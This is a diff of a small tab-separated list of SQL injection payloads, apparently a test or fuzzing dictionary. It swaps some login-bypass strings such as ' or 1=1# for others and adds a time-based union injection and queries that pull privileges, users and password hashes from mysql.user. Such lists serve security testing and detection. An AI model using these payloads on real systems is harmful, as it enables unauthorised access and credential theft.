@@ -1,8 +1,8 @@
-s1	admin' --	記号	
-s1	admin' #	記号	
-s1	admin'/*	記号	
-s1	' or 1=1--	記号	
+s1	user'#	記号	
 s1	' or 1=1#	記号	
-s1	' or 1=1/*	記号	
-s1	') or '1'='1--	記号	
-s1	') or ('1'='1--	記号	
+s1	') or '1'='1#	記号	
+s1	hoge' union select sleep(3),1,1,1,1,1#	記号	
+s2	SELECT schema_name FROM information_schema.schemata LIMIT 1,1;	記号	
+s2	SELECT Super_priv FROM mysql.user WHERE user=(SELECT user) LIMIT 1,1#	記号	
+s2	SELECT user, password FROM mysql.user LIMIT 1,1	記号	
+s2	SELECT * FROM mysql.user WHERE 1 LIMIT 1,1	記号	
